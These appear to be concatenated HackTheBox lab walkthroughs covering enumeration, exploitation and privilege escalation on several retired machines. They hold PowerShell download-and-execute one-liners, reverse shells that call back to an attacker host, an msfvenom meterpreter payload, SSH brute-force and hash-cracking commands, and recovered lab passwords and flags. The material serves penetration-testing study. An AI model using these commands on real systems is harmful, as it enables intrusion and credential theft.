-min-rate 5000 --max-retries 1 -sV -sC -p- -oN Optimum-full-port-scan.txt 10.10.10.8Nmap scan report for 10.10.10.8Host is up (0.15s latency).Not shown: 65534 filtered portsPORT STATE SERVICE VERSION80/tcp open http HttpFileServer httpd 2.3|_http-server-header: HFS 2.3|_http-title: HFS /Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHttpFileServer/2.3 (port 80)gobuster___Method #1: using Metasploit (failed)Inspecting payload with BurpThe exploit seems to save a visual basic script (.vbs) on the target. We press “Forward” button (top left) to go further:Now it execute the malicious script. We press “Forward” again:It worked! We got a meterppreter as user kostas:Downloading winPEAS Download winPEAS.exe (64 bits version) On our machine we run an HTTP Server: python3 -m http.server From victim’s target, go to a world-writeable directory (c:\\Windows\\System32\\spool\\drivers\\color&amp;gt;) and download winPEAS.exe:powershell -command &quot;(new-object System.Net.WebClient).DownloadFile(&#39;http://10.10.14.14:8000/winPEAS.exe&#39;, &#39;c:\\Windows\\System32\\spool\\drivers\\color\\winPEAS.exe&#39;)&quot;Unfortunately, I didn’t find anything interesting in winPEAS output.Therefore, I decided to use metasploit suggester ↓Exploit SuggesterRunning sysinfo within our meterpreter session shows us an issue. We’re facing a Windows with a 64-bit architecture while our meterpreter is 32 bit (x86):x86If we use metasploit suggester anyway:Migrate (x86 → x64)In order to fix this, we can open a shell our meterpreter session and then use the migrate command:x64Now we can use suggester:No exploits were suggested.Method #2: without MetasploitFirst, since our nmap scan identified that the target is running HttpFileServer (HFS) version 2.3, and considering that gobuster didn’t find any thing, let’s search for exploits:It’s interesting to notice that looking for HFS 2.3 gives us more results:However, let’s take a look at the first one:Okay so it’s a very simple RCE:We can see that the ping worked, now we can ask ourselves: how to get a reverse shell?Reverse shellI tried to use this one-line powershell reverse shell but I couldn’t make it works.So I used the one from nishang repository (Invoke-PowerShellTcp.ps1). We simply add the following line to the script:Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 1234 Don’t forget to run a listener nc -lnvp 1234Using the exploit (49125.py) example, we can make the target download and execute this reverse shell file by doing so:$ python3 49125.py $TARGET 80 &quot;c:\\windows\\SysNative\\WindowsPowershell\\v1.0\\powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.14:8000/Invoke-PowerShellTcp.ps1&#39;)&quot; NOTE: c:\\windows\\SysNative\\ is a folder specific to 64-bit Windows while c:\\windows\\System32\\ and c:\\windows\\SysWow64\\ are both 32-bit Windows folders.Now we got a shell:User (kostas)PS C:\\Users\\kostas\\Desktop&amp;gt; type user.txt.txtd0c39409d7b994a9a1389ebf38ef5f73Windows Exploit Suggester - Next Generation (WES-NG)Neither Sherlock, Watson and Windows-Exploit-Suggester worked for me.However, wesng (Windows Exploit Suggester Next Generation) helped to find some exploits.I simply had to save systeminfo output into a file and gave it as an argument:The target machine is Windows Server 2012 R2 Standard version 6.3.9600. It’s a 64 bit machine and many patches have been installed as we see “31 Hotfix(s) Installed”.I was interested in CVE-2016-0099 because of the Empire exploit → Invoke-MS16032.ps1.It appears that the target is vulnerable:PrivescWe have to add this line to Invoke-MS16032.ps1:Invoke-MS16032 -Command &quot;iex(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.14:8000/shell.ps1&#39;)&quot;The script shell.ps1 is just a copy of the nishang Invoke-PowerShellTcp.ps1 script we previously modified. The only difference is the port on which we are redirecting the shell:Go back to our windows reverse shell, download and execute Invoke-MS16032.ps1 by doing so: iex(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.14:8000/Invoke-MS16032.ps1&#39;)Wait for the scripts to be downloaded and executed:YES! We have access to SYSTEM shell:PS C:\\users\\Administrator\\Desktop&amp;gt; type root.txt51ed1b36553c8461f4552c2e92b3eeedUseful links HFS scripting_commands one liner powershell reverse shell CVE-2016-0099 MS16-032 Sherlock Watson Windows-Exploit-Suggester wesng Empire" }, { "title": "HackTheBox - Devel", "url": "/htb-devel/", "categories": "Hackthebox walkthroughs, Windows, Easy", "tags": "htb-windows-easy, ftp, aspx, reverse-shell, powershell, MS11-046, CVE-2011-1249, mingw-w64, msfvenom, metasploit, meterpreter, suggester, MS10-015, CVE-2010-0232, writeup, oscp-prep", "date": "2021-01-06 06:28:51 +0700", "snippet": "Enumerationnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Devel-full-port-scan.txt 10.10.10.5PORT STATE SERVICE VERSION21/tcp open ftp Microsoft ftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)| 03-18-17 01:06AM &amp;lt;DIR&amp;gt; aspnet_client| 03-17-17 04:37PM 689 iisstart.htm|_03-17-17 04:37PM 184946 welcome.png| ftp-syst: |_ SYST: Windows_NT80/tcp open http Microsoft IIS httpd 7.5| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/7.5|_http-title: IIS7Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsMicrosoft-IIS/7.5 (port 80)gobuster$ gobuster dir -u http://10.10.10.5 -w /usr/share/dirb/wordlists/common.txt -o services/80-http.txt#.../aspnet_client (Status: 301)#...FTP (port 21)$ ftp $TARGETConnected to 10.10.10.5.220 Microsoft FTP ServiceName (10.10.10.5:root): anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password:230 User logged in.Remote system type is Windows_NT.ftp&amp;gt; ls200 PORT command successful.125 Data connection already open; Transfer starting.03-18-17 01:06AM &amp;lt;DIR&amp;gt; aspnet_client03-17-17 04:37PM 689 iisstart.htm03-17-17 04:37PM 184946 welcome.png226 Transfer complete.There is an aspnet_client folder like on port 80. Let’s see what’s inside:ftp&amp;gt; cd aspnet_client250 CWD command successful.ftp&amp;gt; ls200 PORT command successful.125 Data connection already open; Transfer starting.03-18-17 01:06AM &amp;lt;DIR&amp;gt; system_web226 Transfer complete.ftp&amp;gt; cd system_web250 CWD command successful.ftp&amp;gt; ls200 PORT command successful.125 Data connection already open; Transfer starting.03-18-17 01:06AM &amp;lt;DIR&amp;gt; 2_0_50727226 Transfer complete.ftp&amp;gt; cd 2_0_50727250 CWD command successful.ftp&amp;gt; ls200 PORT command successful.125 Data connection already open; Transfer starting.226 Transfer complete.ftp&amp;gt; ls -la200 PORT command successful.125 Data connection already open; Transfer starting.226 Transfer complete.ftp&amp;gt; We can log in as anonymous and can write files also:FTP files are directly accessible from the web page!Method #1: without MetasploitReverse shellBecause of the folder name aspnet_client, I looked for “asp net reverse shell” and I found this one. I replaced the IP used in the script by my IP address. I put the file via FTP I visited the following URL: http://10.10.10.5/shell.aspx Then I got a shell: UserCurrently we are iis apppool\\web:c:\\windows\\system32\\inetsrv&amp;gt; whoamiwhoamiiis apppool\\webOur goal is to perform privilege escalation(s) in order to obtain as many rights as possible on the target machine.Let’s list users:C:\\Users&amp;gt;net usernet userUser accounts for \\\\-------------------------------------------------------------------------------Administrator babis Guest The command completed with one or more errors.or we can simply do:c:\\windows\\system32\\inetsrv&amp;gt;cd \\userscd \\usersC:\\Users&amp;gt;dirdir Volume in drive C has no label. Volume Serial Number is 8620-71F1 Directory of C:\\Users18/03/2017 01:16 &amp;lt;DIR&amp;gt; .18/03/2017 01:16 &amp;lt;DIR&amp;gt; ..18/03/2017 01:16 &amp;lt;DIR&amp;gt; Administrator17/03/2017 04:17 &amp;lt;DIR&amp;gt; babis18/03/2017 01:06 &amp;lt;DIR&amp;gt; Classic .NET AppPool14/07/2009 09:20 &amp;lt;DIR&amp;gt; Public 0 File(s) 0 bytes 6 Dir(s) 22.277.554.176 bytes freeThere are two other users that we are interested to: babis AdministratorsysteminfoThe target machine is Microsoft Windows 7 Entreprise server (version → 6.1.7600) with an x86 architecture (32 bits).Download and execute winPEAS.exeLet’s go to a word writable directory (C:\\Windows\\System32\\spool\\drivers\\color) and try to run winPEASC:\\&amp;gt; cd \\windows\\system32\\spool\\drivers\\colorC:\\Windows\\System32\\spool\\drivers\\color&amp;gt;echo amirr0r &amp;gt; testecho amirr0r &amp;gt; testC:\\Windows\\System32\\spool\\drivers\\color&amp;gt;type testtype testamirr0rNative wget in powershell:c:&amp;gt; powershell -command &quot;(new-object System.Net.WebClient).DownloadFile(&#39;http://10.10.14.14:8000/winPEAS.exe&#39;, &#39;c:\\Windows\\System32\\spool\\drivers\\color\\winPEAS.exe&#39;)&quot;Looking for exploitsUnfortunately, I didn’t get any output after executing winPEAS.exe so I directly looked for exploits on Microsoft Windows 7:Compiling exploits Getting exploit based on the EDB-ID (Exploit DataBase IDentifier):$ searchsploit -m 40564 Exploit: Microsoft Windows (x86) - &#39;afd.sys&#39; Local Privilege Escalation (MS11-046) URL: https://www.exploit-db.com/exploits/40564 Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.cFile Type: C source, ASCII text, with CRLF line terminatorsCopied to: /root/htb/machines/Windows/Devel/40564.c Install apt install mingw-w64 Compile the exploit specifically for target machine: $ i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32Privesc (system)Transfer exploit.exe: (Attacker’s machine) run HTTP Server: python3 -m http.server (Victim’s machine) download exploit: powershell -command &quot;(new-object System.Net.WebClient).DownloadFile(&#39;http://10.10.14.14:8000/exploit.exe&#39;, &#39;c:\\Windows\\System32\\spool\\drivers\\color\\exploit.exe&#39;)&quot; Execute exploit.exe:c:\\Windows\\System32\\spool\\drivers\\color&amp;gt;exploit.exe exploit.exec:\\Windows\\System32&amp;gt;whoamiwhoamint authority\\systemFlagsc:\\&amp;gt;cd \\usersc:\\Users&amp;gt;dir /b/s *.txt ... c:\\Users\\Administrator\\Desktop\\root.txt.txt ... c:\\Users\\babis\\Desktop\\user.txt.txt ...c:\\Users&amp;gt;type c:\\Users\\babis\\Desktop\\user.txt.txt9ecdd6a3aedf24b41562fea70f4cb3e8c:\\Users&amp;gt;type c:\\Users\\Administrator\\Desktop\\root.txt.txte621a0b5041708797c4fc4728bc72b4bMethod #2: using Metasploit (meterpreter)1. msfvenomPreparing our malicious file which1 will give us a meterpreter:$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f aspx &amp;gt; meterpreter.aspx[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 354 bytesFinal size of aspx file: 2883 bytes2. Metasploit multi/handlerWe set a listener that can handle a meterpreter session:$ msfconsolemsf6 &amp;gt; set payload windows/meterpreter/reverse_tcppayload =&amp;gt; windows/meterpreter/reverse_tcpmsf6 &amp;gt; use exploit/multi/handler [*] Using configured payload windows/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &amp;gt; show optionsModule options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- -----------Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Wildcard Targetmsf6 exploit(multi/handler) &amp;gt; set LHOST tun0LHOST =&amp;gt; 10.10.14.14msf6 exploit(multi/handler) &amp;gt; run[*] Started reverse TCP handler on 10.10.14.14:4444 3. Meterpreter sesssionUpload the malicious file we prepared via ftpOpen it from browser so that it can be executed on the server side and pops us a meterpreter:I used run -j to run meterpreter session in background while I’ll use suggester.SuggesterWe can Metasploit exploit suggester: session number is different because I made some tests.ExploitationWe cannot use he first exploit suggested (exploit/windows/local/bypassuac_eventvwr) since our current user isn’t in the administrators group.However we can use the second exploit (exploit/windows/local/ms10_015_kitrap0d): Flags are above in method #1 - chapter.___Useful linksMethod 1 CVE-2011-1249 Microsoft Windows (x86) - ‘afd.sys’ Local Privilege Escalation (MS11-046) Microsoft Security Bulletin MS11-046 - Important (Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege)Method 2 Metasploit local exploit suggester CVE-2010-0232 Microsoft Security Bulletin MS10-015 - Important (Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege) Microsoft Windows NT #GP Trap Handler Allows Users to Switch Kernel Stack" }, { "title": "HackTheBox - Legacy", "url": "/htb-legacy/", "categories": "Hackthebox walkthroughs, Windows, Easy", "tags": "htb-windows-easy, SMB, MS08-067, CVE-2008-4250, metasploit, meterpreter, writeup, oscp-prep", "date": "2021-01-05 23:58:12 +0700", "snippet": "Enumerationnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Legacy-full-port-scan.txt 10.10.10.4Nmap scan report for 10.10.10.4Host is up (0.12s latency).Not shown: 65532 filtered portsPORT STATE SERVICE VERSION139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows XP microsoft-ds3389/tcp closed ms-wbt-serverService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xpHost script results:|_clock-skew: mean: -3h56m10s, deviation: 1h24m51s, median: -4h56m10s|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 00:50:56:b9:67:71 (VMware)| smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager)| OS CPE: cpe:/o:microsoft:windows_xp::-| Computer name: legacy| NetBIOS computer name: LEGACY\\x00| Workgroup: HTB\\x00|_ System time: 2021-01-05T13:28:59+02:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_smb2-time: Protocol negotiation failed (SMB2)The target is a Windows XP server running SMB.smb (ports 139 &amp;amp; 445)$ smbclient -L //10.10.10.4/ -U &#39;%&#39; | tee services/139-smbclient.txtprotocol negotiation failed: NT_STATUS_IO_TIMEOUT$ smbmap -H $TARGET -R[+] IP: 10.10.10.4:445 Name: 10.10.10.4$nmap scan vuln$ nmap -min-rate 5000 --max-retries 1 --script vuln -oN vuln-scan.txt 10.10.10.4Two critical vulnerabilities allowing remote code execution affect our target machine: MS08-067 (CVE-2008-4250) MS17-010 (CVE-2017-0143)ExploitationBoth of these vulns can be exploited through Metasploit modules.Metasploit (exploiting MS08-067)SYSTEM usermeterpreter &amp;gt; getuidServer username: NT AUTHORITY\\SYSTEMmeterpreter &amp;gt; pwdC:\\WINDOWS\\system32meterpreter &amp;gt; search -f user.txtFound 1 result... c:\\Documents and Settings\\john\\Desktop\\user.txt (32 bytes)meterpreter &amp;gt; cat C:\\\\Documents\\ and\\ Settings\\\\john\\\\Desktop\\\\user.txte69af0e4f443de7e36876fda4ec7644fmeterpreter &amp;gt; search -f root.txtFound 1 result... c:\\Documents and Settings\\Administrator\\Desktop\\root.txt (32 bytes)meterpreter &amp;gt; cat C:\\\\Documents\\ and\\ Settings\\\\Administrator\\\\Desktop\\\\root.txt993442d258b0e0ec917cae9e695d5713Useful links CVE-2008-4250 Microsoft Security Bulletin MS08-067 - Critical" }, { "title": "HackTheBox - Sunday", "url": "/htb-sunday/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, Solaris, SunOS, finger, guessing, patator, hashcat, sudo misconfiguration, GTFOBins, wget, writeup, oscp-prep", "date": "2021-01-04 18:13:03 +0700", "snippet": "Footholdnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Sunday-full-port-scan.txt 10.10.10.76Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-04 09:27 CETWarning: 10.10.10.76 giving up on port because retransmission cap hit (1).Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 20.79% done; ETC: 09:27 (0:00:19 remaining)Nmap scan report for 10.10.10.76Host is up (0.11s latency).Not shown: 64580 filtered ports, 950 closed portsPORT STATE SERVICE VERSION79/tcp open finger Sun Solaris fingerd|_finger: No one logged on\\x0D111/tcp open rpcbind 2-4 (RPC #100000)22022/tcp open ssh SunSSH 1.3 (protocol 2.0)| ssh-hostkey: | 1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)|_ 1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)41462/tcp open unknown49906/tcp open unknownService Info: OS: Solaris; CPE: cpe:/o:sun:sunosfinger (port 79)We can use pentestmonkey’s script finger-user-enum.pl to do our enumeration:Okay, we know there iis at least 5 users: root admin adm mysql userWhile figuring out what to do next on Hacktricks - pentesting finger, I ran finger-user-enum.pl a second time with a bigger wordlist: We could also use metasploit with use auxiliary/scanner/finger/finger_users.$ ./finger-user-enum.pl -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt -t $TARGETFrom the screenshot above, we can notice tree things: We got more valid usernames The user sunny seems to have been connected from a remote IP address 10.10.10.4 The user root seems to have been connected from the local machine sundaySSH (port 22022)Bruteforce old SSH with patatorProbably due to an exchange algorithm error, we’ll use patator instead of using hydra to bruteforce ssh.$ patator ssh_login host=$TARGET port=22022 user=sunny password=FILE0 0=/usr/share/wordlists/seclists/Passwords/probable-v2-top1575.txt persistent=0 -x ignore:mesg=&#39;Authentication failed.&#39; --timeout=5Valid credentials found/guessed: username: sunny password: sundayUser (sunny)$ ssh -p 22022 sunny@$TARGETUnable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 sunny@$TARGETThe authenticity of host &#39;[10.10.10.76]:22022 ([10.10.10.76]:22022)&#39; can&#39;t be established.RSA key fingerprint is SHA256:TmRO9yKIj8Rr/KJIZFXEVswWZB/hic/jAHr78xGp+YU.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#39;[10.10.10.76]:22022&#39; (RSA) to the list of known hosts.Password: Last login: Tue Apr 24 10:48:11 2018 from 10.10.14.4Sun Microsystems Inc. SunOS 5.11 snv_111b November 2008sunny@sunday:~$ There is another user called sammy who has a home directory:sunny@sunday:~$ cd ..sunny@sunday:/export/home$ ls -latotal 8drwxr-xr-x 4 root root 4 2018-04-15 20:18 .drwxr-xr-x 3 root root 3 2018-04-15 19:44 ..drwxr-xr-x 18 sammy staff 27 2020-07-31 18:00 sammydrwxr-xr-x 18 sunny other 30 2018-04-15 20:52 sunnyLet’s run sudo -l:sunny@sunday:/tmp$ sudo -lUser sunny may run the following commands on this host: (root) NOPASSWD: /root/trollSince we can only execute it, I will not spend time on it (for the moment).On /, there is backup directory which we have access to:sunny@sunday:/tmp$ cd /backupsunny@sunday:/backup$ ls -latotal 5drwxr-xr-x 2 root root 4 2018-04-15 20:44 .drwxr-xr-x 26 root root 27 2020-07-31 17:59 ..-r-x--x--x 1 root root 53 2018-04-24 10:35 agent22.backup-rw-r--r-- 1 root root 319 2018-04-15 20:44 shadow.backupsunny@sunday:/backup$ cat shadow.backupmysql:NP:::::::openldap:*LK*:::::::webservd:*LK*:::::::postgres:NP:::::::svctag:*LK*:6445::::::nobody:*LK*:6445::::::noaccess:*LK*:6445::::::nobody4:*LK*:6445::::::sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::: $5$ is for SHA-256 hash.“Cracking” sammy’s password with hashcatAccording to the manpage of hashcat, 7400 is SHA-256 mode:Sammy’s password is cooldude!.User (sammy) flag:sammy@sunday:~$ cd Desktopsammy@sunday:~/Desktop$ cat user.txta3d9498027ca5187ba1793943ee8a598 sudo -l:sammy@sunday:~/Desktop$ sudo -lUser sammy may run the following commands on this host: (root) NOPASSWD: /usr/bin/wgetsammy@sunday:~/Desktop$Let’s check wget on GTFOBins - wget to see how we can privesc:We cannot use it to privesc!Even if we can download a malicious file and then execute it, it will not be done as root but as sammy. This is because of the pipe (|) as you can see on the image below:However there are other things that we can probably do. We can read every file: We can overwrite the /root/troll binaryRoot flag:root@sunday:~# cd /rootroot@sunday:/root# cat root.txtfb40fab61d99d37536daeec0d97af9b8Useful links pentestmokey - finger enum hacktricks - pentesting finger Hashcat - example hashes" }, { "title": "HackTheBox - Traverxec", "url": "/htb-traverxec/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, nostromo, RCE, CVE-2019-16278, metasploit, reverse-shell, password cracking, hashcat, rabbit hole, ssh2john, John The Ripper, sudo misconfiguration, GTFOBins, journalctl, less, shrink terminal, writeup, oscp-prep", "date": "2021-01-02 22:37:46 +0700", "snippet": "Footholdnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Traverxec-full-port-scan.txt 10.10.10.165Nmap scan report for 10.10.10.165Host is up (0.10s latency).Not shown: 65533 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)| ssh-hostkey: | 2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)| 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)|_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)80/tcp open http nostromo 1.9.6|_http-server-header: nostromo 1.9.6|_http-title: TRAVERXECnostromo 1.9.6 (port 80)Looking at server’s HTTP response headers we can confirm that we’re facing with nostromo version 1.9.6. We already saw that via nmap scan.There is a RCE vuln on this specific version:MetasploitNow we have a shell as www-data user.User (david)As expected (because of the web page), there is a user called david:w-data@traverxec:/usr/bin$ cd /homecd /homewww-data@traverxec:/home$ ls -lals -latotal 12drwxr-xr-x 3 root root 4096 Oct 25 2019 .drwxr-xr-x 18 root root 4096 Oct 25 2019 ..drwx--x--x 5 david david 4096 Oct 25 2019 davidwww-data@traverxec:/home$ cd davidwww-data@traverxec:/home/david$ lsls: cannot open directory &#39;.&#39;: Permission deniedIt’s weird because we can enter to david’s home directory but we cannot see what’s inside. However there are some things that we have access to:www-data@traverxec:/home/david$ head -n5 .bashrchead -n5 .bashrc# ~/.bashrc: executed by bash(1) for non-login shells.# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)# for examples# If not running interactively, don&#39;t do anythingwww-data@traverxec:/home/david$ cat user.txtcat user.txtcat: user.txt: Permission deniedVia linpeas.sh, we can see this interesting information:It looks like an ` /etc/shadow` password. $1 indicates that the hashing algorithm used is MD5 e7NfNpNi (the content between the second and third $ sign) is the salt value. A6nCwOTqrNR2oDuIKirRZ is hash of “password + salt”Crcaking .htpasswd using hashcat -m 500 tells hashcat to use MD5(Unix) modeBut we cannot log in as david with this password: Nowonly4me.www-data@traverxec:/tmp$ su david su davidPassword: Nowonly4mesu: Authentication failurewww-data@traverxec:/tmp$/var/nostromo/confI decided to investigate more in /var/nostromo/conf directory, because it’s where we found .htpasswd file:www-data@traverxec:/var/nostromo/conf$ ls -lals -latotal 20drwxr-xr-x 2 root daemon 4096 Oct 27 2019 .drwxr-xr-x 6 root root 4096 Oct 25 2019 ..-rw-r--r-- 1 root bin 41 Oct 25 2019 .htpasswd-rw-r--r-- 1 root bin 2928 Oct 25 2019 mimes-rw-r--r-- 1 root bin 498 Oct 25 2019 nhttpd.confThere is a file called nhttpd.conf. Let’s see its content:www-data@traverxec:/var/nostromo/conf$ cat nhttpd.confcat nhttpd.conf# MAIN [MANDATORY]servername traverxec.htbserverlisten *serveradmin david@traverxec.htbserverroot /var/nostromoservermimes conf/mimesdocroot /var/nostromo/htdocsdocindex index.html# LOGS [OPTIONAL]logpid logs/nhttpd.pid# SETUID [RECOMMENDED]user www-data# BASIC AUTHENTICATION [OPTIONAL]htaccess .htaccesshtpasswd /var/nostromo/conf/.htpasswd# ALIASES [OPTIONAL]/icons /var/nostromo/icons# HOMEDIRS [OPTIONAL]homedirs /homehomedirs_public public_wwwThe last two lines indicates that we can access to /home directory through http://10.10.10.165/~username if the user has a sub directory called public_www.Let’s try http://10.10.10.165/:/home/david/public_wwwwww-data@traverxec:/var/nostromo/conf$ cd /home/david/public_wwwcd /home/david/public_wwwwww-data@traverxec:/home/david/public_www$ ls -lals -latotal 16drwxr-xr-x 3 david david 4096 Oct 25 2019 .drwx--x--x 5 david david 4096 Oct 25 2019 ..-rw-r--r-- 1 david david 402 Oct 25 2019 index.htmldrwxr-xr-x 2 david david 4096 Oct 25 2019 protected-file-areawww-data@traverxec:/home/david/public_www$ Let’s take a look at protected-file-area directory:www-data@traverxec:/home/david/public_www$ cd protected-file-areacd protected-file-areawww-data@traverxec:/home/david/public_www/protected-file-area$ ls -latotal 16drwxr-xr-x 2 david david 4096 Oct 25 2019 .drwxr-xr-x 3 david david 4096 Oct 25 2019 ..-rw-r--r-- 1 david david 45 Oct 25 2019 .htaccess-rw-r--r-- 1 david david 1915 Oct 25 2019 backup-ssh-identity-files.tgzwww-data@traverxec:/home/david/public_www/protected-file-area$ cat .htaccessrealm David&#39;s Protected File Area. Keep out!I want to open backup-ssh-identity-files.tgz. In order to transfer it to my machine, I decided to use base64:www-data@traverxec:/home/david/public_www/protected-file-area$ cat backup-ssh-identity-files.tgz | base64entity-files.tgz | base64H4sIAANjs10AA+2YWc+jRhaG+5pf8d07HfYtV8O+Y8AYAzcROwabff/1425pNJpWMtFInWRm4uemgKJ0UL311jlF2T4zMI2Wewr+OI4l+Ol3AHpBQtCXFibxf2n/wScYxXGMIGCURD5BMELCyKcP/Pf4mG+ZxykaPj4+fZ2Df/Peb/X/j1J+o380T2U73I8s/bnO9vG7xPgiMIFhv6o/AePf6E9AxEt/6LtE/w3+4vq/NP88jNEH84JFzSPi4D1BhC+3PGMz7JfHjM2N/jAadgJdSVjy/NeVew4UGQkXbu02dzPh6hzE7jwt5h64paBUQcd5I85rZXhHBnNuFCo8CTsocnTcPbm7OkUttG1KrEJIcpKJHkYjRhzchYAl5rjjTeZjeoUIYKeUKaqyYuAo9kqTHEEYZ/Tq9ZuWNNLALUFTqotmrGRzcRQw8V1LZoRmvUIn84YcrKakVOI4+iaJu4HRXcWH1sh4hfTIU5ZHKWjxIjo1BhV0YXTh3TCUWr5IerpwJh5mCVNtdTlybjJ2r53ZXvRbVaPNjecjp1oJY3s6k15TJWQY5Em5s0HyGrHE9tFJuIG3BiQuZbTa2WSSsJaEWHX1NhN9noI66mX+4+ua+ts0REs2bFkC/An6f+v/e/rzazl83xhfPf7r+z+KYsQ//Y/iL/9jMIS//f9H8PkLrCAp5odzYT4sR/EYV/jQhOBrD2ANbfLZ3bvspw/sB8HknMByBR7gBe2z0uTtTx+McPkMI9RnjuV+wEhSEESRZXBCpHmEQnkUo1/68jgPURwmAsCY7ZkM5pkE0+7jGhnpIocaiPT5TnXrmg70WJD4hpVWp6pUEM3lrR04E9Mt1TutOScB03xnrTzcT6FVP/T63GRKUbTDrNeedMNqjMDhbs3qsKlGl1IMA62aVDcvTl1tnOujN0A7brQnWnN1scNGNmi1bAmVOlO6ezxOIyFVViduVYswA9JYa9XmqZ1VFpudydpfefEKOOq1S0Zm6mQm9iNVoXVx9ymltKl8cM9nfWaN53wR1vKgNa9akfqus/quXU7j1aVBjwRk2ZNvGBmAgicWg+BrM3S2qEGcgqtun8iabPKYzGWl0FSQsIMwI+gBYnzhPC0YdigJEMBnQxp2u8M575gSTtb3C0hLo8NCKeROjz5AdL8+wc0cWPsequXeFAIZW3Q1dqfytc+krtN7vdtY5KFQ0q653kkzCwZ6ktebbV5OatEvF5sO+CpUVvHBUNWmWrQ8zreb70KhCRDdMwgTcDBrTnggD7BV40hl0coCYel2tGCPqz5DVNU+pPQW8iYe+4iAFEeacFaK92dgW48mIqoRqY2U2xTH9IShWS4Sq7AXaATPjd/JjepWxlD3xWDduExncmgTLLeop/4OAzaiGGpf3mi9vo4YNZ4OEsmY8kE1kZAXzSmP7SduGCG4ESw3bxfzxoh9M1eYw+hV2hDAHSGLbHTqbWsuRojzT9s3hkFh51lXiUIuqmGOuC4tcXkWZCG/vkbHahurDGpmC465QH5kzORQg6fKD25u8eo5E+V96qWx2mVRBcuLGEzxGeeeoQOVxu0BH56NcrFZVtlrVhkgPorLcaipFsQST097rqEH6iS1VxYeXwiG6LC43HOnXeZ3Jz5d8TpC9eRRuPBwPiFjC8z8ncj9fWFY/5RhAvZY1bBlJ7kGzd54JbMspqfUPNde7KZigtS36aApT6T31qSQmVIApga1c9ORj0NuHIhMl5QnYOeQ6ydKDosbDNdsi2QVw6lUdlFiyK9blGcUvBAPwjGoEaA5dhC6k64xDKIOGm4hEDv04mzlN38RJ+esB1kn0ZlsipmJzcY4uyCOP+K8wS8YDF6BQVqhaQuUxntmugM56hklYxQso4sy7ElUU3p4iBfras5rLybx5lC2Kva9vpWRcUxzBGDPcz8wmSRaFsVfigB1uUfrGJB8B41Dtq5KMm2yhzhxcAYJl5fz4xQiRDP51jEzhXMFQEo6ihUnhNc0R25hTn0Qpf4wByp8N/mdGQRmPmmLF5bBI6jKiy7mLbI76XmW2CfN+IBqmVm0rRDvU9dVihl7v0I1RmcWK2ZCYZe0KSRBVnCt/JijvovyLdiQBDe6AG6cgjoBPnvEukh3ibGFd+Y2jFh8u/ZMm/q5cCXEcCHTMZrciH6sMoRFFYj3mxCr8zoz8w3XS6A8O0y4xPKsbNzRZH3vVBdsMp0nVIv0rOC3OtfgTH8VToU/eXl+JhaeR5+Ja+pwZ885cLEgqV9sOL2z980ytld9cr8/naK4ronUpOjDYVkbMcz1NuG0M9zREGPuUJfHsEa6y9kAKjiysZfjPJ+a2baPreUGga1d1TG35A7mL4R9SuIIFBvJDLdSdqgqkSnIi8wLRtDTBHhZ0NzFK+hKjaPxgW7LyAY1d3hic2j